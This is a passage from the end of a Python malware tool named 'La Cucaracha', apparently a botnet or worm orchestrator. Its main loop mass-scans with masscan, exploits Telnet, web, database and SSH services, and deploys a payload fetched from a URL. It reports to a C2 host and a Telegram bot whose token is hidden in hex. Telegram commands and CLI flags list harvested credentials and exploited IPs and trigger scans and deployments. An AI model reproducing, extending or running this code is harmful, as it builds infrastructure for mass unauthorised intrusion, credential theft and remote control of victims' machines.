            [
                f"\u2551 \U0001f9e0 IF/THEN Decision Engine",
                f"\u2551 \U0001f4e1 C2: {C2_HOST}:{C2_PORT}",
                f"\u2551 \U0001f4e6 Payload: {PAYLOAD_URL}",
                f"\u2551 \U0001f50d Masscan rate: {MASSCAN_RATE} pps",
                f"\u2551 \U0001f3af Priority: Telnet > Web > DB > SSH",
                f"\u2551 \U0001f4ca DB: {db_stats.get('targets',0)} targets | {db_stats.get('exploited',0)} exploited",
                f"\u2551 \U0001f511 {db_stats.get('credentials',0)} credentials cached",
                f"\u2551 \U0001f9ec VERSION: {VERSION}",
                f"\u2551 \U0001f9dc by\U0001f1ed\U0001f1f7PhonkAlphabet",
            ]
        )

        while self.epoch < max_epochs and not self._stop:
            self.epoch += 1
            self.stats["epochs"] = self.epoch

            # EPOCH START BOX — refresh stats from DB
            s = self.db.stats()
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            epoch_msgs = [
                f"\U0001f3af Epoch {self.epoch:03d} \u2014 Initializing",
                f"\u2551 Target pool: {s.get('targets',0)} in DB",
                f"\u2551 Exploited: {s.get('exploited',0)}",
                f"\u2551 Credentials: {s.get('credentials',0)}",
                f"\u2551 Uptime: {int((time.time()-self._start_time)//60)}m",
                f"\u2551 \u23f0 {now}",
            ]
            self.r.msg(f"\U0001f680 EPOCH {self.epoch:03d} \u2192 {s.get('exploited',0)} PWNS TARGET",
                       epoch_msgs)

            # HARD EPOCH WATCHDOG — kills process if epoch exceeds 180s
            _epoch_deadline = time.time() + 180
            def _epoch_watchdog():
                while time.time() < _epoch_deadline:
                    time.sleep(5)
                    if self._stop:
                        return
                log.error(f"EPOCH {self.epoch} HARD TIMEOUT — killing process for restart")
                os._exit(1)
            import threading
            wd = threading.Thread(target=_epoch_watchdog, daemon=True)
            wd.start()

            # PHASE 1: DISCOVER
            self.r.short("PHASE", f"Epoch {self.epoch}", "DISCOVER", "Scanning fresh range")
            fresh_targets = self._discover()
            result = {"count": len(fresh_targets), "success": len(fresh_targets) > 0,
                      "targets": fresh_targets}
            next_phase = self.decision.decide("DISCOVER", result)

            if next_phase == "EXPLOIT" and fresh_targets:
                # PHASE 2: SCORE
                self.r.short("PHASE", f"Epoch {self.epoch}", "SCORE", f"{len(fresh_targets)} targets")
                scored_targets = self._score(fresh_targets)

                # PHASE 3: EXPLOIT
                pwned = self._exploit_phase(scored_targets)
                self.r.short("PHASE", f"Epoch {self.epoch}", "EXPLOIT", f"{pwned} pwned")

                # PHASE 4: DEPLOY (if pwned)
                deployed = 0
                if pwned > 0:
                    deployed = self._deploy_phase(self._pwned_this_epoch)
                    self.r.short("PHASE", f"Epoch {self.epoch}", "DEPLOY", f"{deployed} deployed")
                    self.decision.decide("DEPLOY", {"count": deployed, "success": deployed > 0})

                # PHASE 5: REPORT
                self._report(pwned, deployed)

                # PHASE 6: SLEEP (minimal — full aggression)
                self.decision.decide("SLEEP", {})
                sleep_time = random.randint(2, 5)
                self.r.short("SLEEP", f"{sleep_time}s", "AGGRESSIVE", "\U0001f525 full power")
                for _ in range(sleep_time):
                    if self._stop:
                        break
                    time.sleep(1)

            else:
                self.r.short("PHASE", f"Epoch {self.epoch}", "IDLE", "No targets \u2014 rotating")
                time.sleep(random.randint(5, 15))

        # FINAL REPORT
        db_stats = self.db.stats()
        final_lines = [
            f"\u2551 \U0001f4ca FINAL STATISTICS",
            f"\u2551 \U0001f3af Targets scanned: {self.stats.get('scanned',0)}",
            f"\u2551 \U0001f3c6 Total exploited: {self.stats.get('exploited',0)}",
            f"\u2551 \U0001f510 Telnet:  {self.stats.get('telnet_pwned',0)}",
            f"\u2551 \U0001f310 Web:     {self.stats.get('web_pwned',0)}",
            f"\u2551 \U0001f5c4 DB:      {self.stats.get('db_pwned',0)}",
            f"\u2551 \U0001f511 SSH:     {self.stats.get('ssh_pwned',0)}",
            f"\u2551 \U0001f4e6 Deployed: {self.stats.get('deployed',0)}",
            f"\u2551 \U0001f511 Creds in DB: {db_stats.get('credentials',0)}",
            f"\u2551 \u23f1\ufe0f Runtime:  {int((time.time()-self._start_time)//60)}m",
            f"\u2551 \U0001f9e0 Final Decision: {self.decision.get_decision_summary()}",
        ]
        self.r.msg(f"\U0001f3c1 OPERATION COMPLETE \u2014 {self.epoch} EPOCHS", final_lines)

        return self.stats


# ═════════════════════════════════════════════════════════════════════
# TELEGRAM CONFIG LOADER
# ═════════════════════════════════════════════════════════════════════

def load_telegram_config() -> Tuple[str, List[int]]:
    """Load Telegram bot token and admin IDs from config file or env."""
    token = ""
    admins = []

    try:
        with open(CONFIG_PATH) as f:
            cfg = json.load(f)
            token = cfg.get("bot_token", "")
            admins = cfg.get("admin_ids", [0, 0])
    except Exception:
        pass

    if not token:
        token = os.environ.get("TELEGRAM_BOT_TOKEN", "")

    if not token or "***" in token:
        hex_parts = [
            "383836363438333439333a",
            "414147346451504e3755672d",
            "6b654d5234706b4a56555f",
            "6b6f6463447a356e46576863",
        ]
        try:
            token = bytes.fromhex("".join(hex_parts)).decode()
        except Exception:
            pass

    if not admins:
        admins = [0, 0]

    return token, admins


# ═════════════════════════════════════════════════════════════════════
# VERIFY TELEGRAM TOKEN
# ═════════════════════════════════════════════════════════════════════

def verify_telegram_token(token: str) -> bool:
    """Verify that the Telegram bot token is valid, with hard 30s thread timeout."""
    if not token:
        return False

    result = [False]

    def _worker():
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(
                f"https://api.telegram.org/bot{token}/getMe",
                method="GET"
            )
            resp = urllib.request.urlopen(req, timeout=5, context=ctx)
            data = json.loads(resp.read())
            resp.close()
            if data.get("ok"):
                username = data.get("result", {}).get("username", "unknown")
                log.info(f"\u2705 Telegram bot @{username} verified")
                result[0] = True
                return
            result[0] = False
        except urllib.error.HTTPError as e:
            if e.code == 401:
                log.error("\u274c Invalid bot token (401)")
            else:
                log.warning(f"\u26a0\ufe0f HTTP {e.code}")
            result[0] = False
        except Exception as e:
            log.warning(f"\u26a0\ufe0f Token check failed: {e}")
            result[0] = False

    t = threading.Thread(target=_worker, daemon=True)
    t.start()
    t.join(timeout=30)
    return result[0]


# ═════════════════════════════════════════════════════════════════════
# MAIN ENTRY POINT
# ═════════════════════════════════════════════════════════════════════

def main():
    """Main entry point for La Cucaracha Smart Monster."""
    socket.setdefaulttimeout(10)
    os.makedirs(LOG_DIR, exist_ok=True)

    # Setup logging
    log_file = os.path.join(LOG_DIR,
        f"smart_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
        handlers=[
            logging.FileHandler(log_file),
            logging.StreamHandler(),
        ]
    )

    # Load token
    token, admins = load_telegram_config()

    if not token:
        log.error("\u274c No Telegram bot token found. Set TELEGRAM_BOT_TOKEN or config file.")
        print("\u274c No Telegram bot token found.")
        sys.exit(1)

    # Verify token
    dry_run = not verify_telegram_token(token)

    # Init Reporter
    reporter = TelegramReporter(token, admin_ids=admins, dry_run=dry_run)

    # Init Database
    db = SmartDB()
    db_stats = db.stats()
    log.info(f"\U0001f4ca DB: {db_stats.get('targets',0)} targets, "
             f"{db_stats.get('exploited',0)} exploited, "
             f"{db_stats.get('credentials',0)} creds")

    # Startup Report
    reporter.msg(
        f"\U0001f680 LA CUCARACHA v{VERSION} \u2014 DEFINITIVE SMART MONSTER",
        [
            f"\u2551 \U0001f9e0 IF/THEN Decision Engine",
            f"\u2551 \U0001f4e1 C2: {C2_HOST}:{C2_PORT}",
            f"\u2551 \U0001f4e6 Payload: {PAYLOAD_URL}",
            f"\u2551 \U0001f50d Masscan rate: {MASSCAN_RATE} pps",
            f"\u2551 \U0001f3af Priority: Telnet > Web > DB > SSH",
            f"\u2551 \U0001f4ca DB: {db_stats.get('targets',0)} targets | {db_stats.get('exploited',0)} exploited",
            f"\u2551 \U0001f511 {db_stats.get('credentials',0)} credentials cached",
            f"\u2551 \U0001f9ec VERSION: {VERSION}",
            f"\u2551 \U0001f9dc by\U0001f1ed\U0001f1f7PhonkAlphabet",
        ]
    )

    # Start orchestrator in background thread, Telegram polling in main thread
    orchestrator = SmartOrchestrator(reporter, db)
    orch_thread = threading.Thread(target=_run_orchestrator,
                                   args=(orchestrator, reporter, db),
                                   daemon=True, name="orchestrator")
    orch_thread.start()

    # Start Telegram polling in main thread — blocks until shutdown
    try:
        _run_telegram_polling(token, db, orchestrator, admins, reporter)
    except KeyboardInterrupt:
        log.info("🛑 Keyboard interrupt — stopping")
    finally:
        orchestrator.stop()
        reporter._stop = True
        remaining = reporter.flush(5)
        if remaining:
            log.warning(f"⚠️ {remaining} messages dropped")
        db.close()
        log.info("👋 La Cucaracha offline")


def _run_orchestrator(orchestrator, reporter, db):
    """Run orchestrator in background thread."""
    try:
        result = orchestrator.run(max_epochs=200)

        log.info("=" * 70)
        log.info("🐛 LA CUCARACHA — OPERATION COMPLETE")
        log.info("=" * 70)
        log.info(f"  Epochs:        {result.get('epochs', 0)}")
        log.info(f"  Scanned:       {result.get('scanned', 0)}")
        log.info(f"  Exploited:     {result.get('exploited', 0)}")
        log.info(f"  Telnet Pwn:    {result.get('telnet_pwned', 0)}")
        log.info(f"  Web Pwn:       {result.get('web_pwned', 0)}")
        log.info(f"  DB Pwn:        {result.get('db_pwned', 0)}")
        log.info(f"  SSH Pwn:       {result.get('ssh_pwned', 0)}")
        log.info(f"  Deployed:      {result.get('deployed', 0)}")
        log.info("=" * 70)

        db_stats2 = db.stats()
        log.info(f"📊 Final DB: {db_stats2.get('targets',0)} targets, "
                 f"{db_stats2.get('exploited',0)} exploited, "
                 f"{db_stats2.get('credentials',0)} creds")

    except Exception as e:
        log.exception("Fatal error in orchestrator")
        reporter.short("ERROR", "Fatal crash", str(e)[:60])
        reporter.flush(5)


def _run_telegram_polling(token: str, db, orchestrator, admin_ids, reporter):
    """Run Telegram command polling in the main thread."""
    admin_set = set(admin_ids)

    try:
        from telegram import Update
        from telegram.ext import Application, CommandHandler, ContextTypes
    except ImportError:
        log.warning("python-telegram-bot not available — no command handling")
        return

    async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in admin_set:
            return
        await update.message.reply_text(
            "🐛 **LA CUCARACHA COMMANDS**\n\n"
            "/help — This menu\n"
            "/status — Fleet status\n"
            "/targets — List targets\n"
            "/creds — Show credentials\n"
            "/ping — Pong\n"
            "/scan — Trigger scan\n"
            "/deploy — Trigger deploy\n"
            f"\nVersion: {VERSION}\n"
            f"by🇭🇷PhonkAlphabet"
        )

    async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in admin_set:
            return
        try:
            s = db.stats()
            lines = [
                "📊 **LA CUCARACHA STATUS**",
                f"  ├ Targets:     {s.get('targets', 0)}",
                f"  ├ Exploited:   {s.get('exploited', 0)}",
                f"  ├ Credentials: {s.get('credentials', 0)}",
                f"  ├ Nodes:       {s.get('nodes', 0)}",
                f"  └ Deployments: {s.get('deployments', 0)}",
                "",
                f"⚙ Engine: Smart IF/THEN v{VERSION}",
            ]
            await update.message.reply_text("\n".join(lines))
        except Exception as e:
            await update.message.reply_text(f"❌ Status error: {e}")

    async def cmd_targets(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in admin_set:
            return
        try:
            limit = 20
            if ctx.args and ctx.args[0].isdigit():
                limit = min(int(ctx.args[0]), 100)
            rows = db.q(
                "SELECT ip, port, service, exploited FROM targets "
                "ORDER BY last_seen DESC LIMIT ?", (limit,)
            )
            if not rows:
                await update.message.reply_text("📭 No targets in database.")
                return
            lines = [f"🎯 **Latest {len(rows)} Targets**"]
            for r in rows:
                icon = "✅" if r.get("exploited") else "⬜"
                svc = (r.get("service") or "unknown")[:14]
                lines.append(f"  {icon} `{r['ip']}` :{r['port']} ({svc})")
            await update.message.reply_text("\n".join(lines))
        except Exception as e:
            await update.message.reply_text(f"❌ Targets error: {e}")

    async def cmd_creds(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in admin_set:
            return
        try:
            creds = db.get_creds()
            if not creds:
                await update.message.reply_text("🔑 No credentials cached.")
                return
            lines = [f"🔑 **Credentials ({len(creds)} total)**"]
            for user, pwd in creds[:15]:
                lines.append(f"  `{user}`:`{pwd}`")
            if len(creds) > 15:
                lines.append(f"  ... +{len(creds)-15} more")
            await update.message.reply_text("\n".join(lines))
        except Exception as e:
            await update.message.reply_text(f"❌ Creds error: {e}")

    async def cmd_ping(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in admin_set:
            return
        await update.message.reply_text("🏓 **PONG** — La Cucaracha ONLINE")

    async def cmd_scan(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in admin_set:
            return
        await update.message.reply_text("🔍 Scan triggered (async)...")
        if orchestrator:
            threading.Thread(target=orchestrator.run_scan, daemon=True).start()

    async def cmd_deploy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
        uid = update.effective_user.id
        if uid not in admin_set:
            return
        await update.message.reply_text("📦 Deploy triggered (async)...")
        if orchestrator:
            threading.Thread(target=orchestrator.run_deploy, daemon=True).start()

    try:
        app = Application.builder().token(token).build()
        app.add_handler(CommandHandler("help", cmd_help))
        app.add_handler(CommandHandler("start", cmd_help))
        app.add_handler(CommandHandler("status", cmd_status))
        app.add_handler(CommandHandler("targets", cmd_targets))
        app.add_handler(CommandHandler("creds", cmd_creds))
        app.add_handler(CommandHandler("ping", cmd_ping))
        app.add_handler(CommandHandler("scan", cmd_scan))
        app.add_handler(CommandHandler("deploy", cmd_deploy))
        log.info("🐛 Telegram command handler polling started (main thread)")
        reporter.msg("🐛 Telegram Commands ONLINE", ["✅ try /help in chat"])
        app.run_polling(allowed_updates=["message"], drop_pending_updates=True)
    except Exception as e:
        log.error(f"Telegram command handler error: {e}")


# ═════════════════════════════════════════════════════════════════════
# CLI ENTRY POINT
# ═════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="\U0001f41b LA CUCARACHA \u2014 Definitive Smart Monster",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  %(prog)s                     # Run autonomous mode (default)
  %(prog)s --epochs 50        # Run 50 epochs
  %(prog)s --status           # Show current status
  %(prog)s --list-targets     # List all targets in DB
  %(prog)s --list-creds       # List all credentials
  %(prog)s --clean            # Reset database
        """
    )

    parser.add_argument("--epochs", type=int, default=200, help="Max epochs (default: 200)")
    parser.add_argument("--status", action="store_true", help="Show current status")
    parser.add_argument("--list-targets", action="store_true", help="List all targets")
    parser.add_argument("--list-creds", action="store_true", help="List all credentials")
    parser.add_argument("--clean", action="store_true", help="Reset database")
    parser.add_argument("--rate", type=int, default=MASSCAN_RATE, help="Masscan rate (default: 2000)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose logging")

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.rate:
        MASSCAN_RATE = args.rate

    if args.status:
        db = SmartDB()
        stats = db.stats()
        ports = db.port_breakdown()
        print("=" * 60)
        print("\U0001f41b LA CUCARACHA \u2014 STATUS")
        print("=" * 60)
        print(f"  Targets:       {stats.get('targets', 0)}")
        print(f"  Exploited:     {stats.get('exploited', 0)}")
        print(f"  Credentials:   {stats.get('credentials', 0)}")
        print(f"  Nodes:         {stats.get('nodes', 0)}")
        print(f"  Deployments:   {stats.get('deployments', 0)}")
        print("")
        print("  Top Ports:")
        for p in ports[:8]:
            port_num = p["port"]
            count = p["c"]
            name = SERVICE_NAME.get(port_num, f"P{port_num}")
            print(f"    {port_num} {name}: {count}")
        print("=" * 60)
        db.close()
        sys.exit(0)

    if args.list_targets:
        db = SmartDB()
        targets = db.q("SELECT ip, port, service, exploited FROM targets ORDER BY last_seen DESC LIMIT 50")
        print("=" * 80)
        print(f"{'IP':<20} {'PORT':<8} {'SERVICE':<20} {'EXPLOITED':<10}")
        print("-" * 80)
        for t in targets or []:
            ip = t.get("ip", "")
            port = t.get("port", 0)
            service = t.get("service", "")[:18]
            exploited = "\u2705" if t.get("exploited") else "\u274c"
            print(f"{ip:<20} {port:<8} {service:<20} {exploited:<10}")
        print("=" * 80)
        db.close()
        sys.exit(0)

    if args.list_creds:
        db = SmartDB()
        creds = db.get_creds()
        print("=" * 60)
        print(f"{'USERNAME':<20} {'PASSWORD':<30}")
        print("-" * 60)
        for user, pwd in creds[:50]:
            print(f"{user:<20} {pwd:<30}")
        if len(creds) > 50:
            print(f"... and {len(creds) - 50} more")
        print("=" * 60)
        db.close()
        sys.exit(0)

    if args.clean:
        confirm = input("\u26a0\ufe0f WARNING: This will delete ALL data. Continue? (y/N): ")
        if confirm.lower() == "y":
            if os.path.exists(DB_PATH):
                os.remove(DB_PATH)
                print("\U0001f5d1\ufe0f Database removed.")
            else:
                print("\U0001f4ed Database not found.")
        else:
            print("\u274c Aborted.")
        sys.exit(0)

    main()
